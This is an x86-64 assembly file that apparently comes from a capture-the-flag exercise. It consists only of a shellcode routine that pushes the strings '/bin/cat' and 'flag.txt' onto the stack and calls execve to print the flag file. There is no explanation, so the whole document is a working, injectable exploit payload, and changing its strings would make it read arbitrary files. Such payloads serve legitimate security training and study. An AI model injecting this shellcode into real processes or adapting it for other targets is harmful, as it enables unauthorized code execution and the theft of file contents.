section .text
    global shellcode
    shellcode:
        xor rsi, rsi
        push rsi
        mov  rdi, 0x7478742e67616c66
        push rdi
        mov r10, rsp

        xor rdi, rdi
        push rdi

        mov rdi,  0x7461632f6e69622f
        push rdi

        mov rdi, rsp
        push rsi
        push r10
        push rdi

        push 0x3b
        pop rax
        mov rsi, rsp
        xor rdx, rdx
        syscall
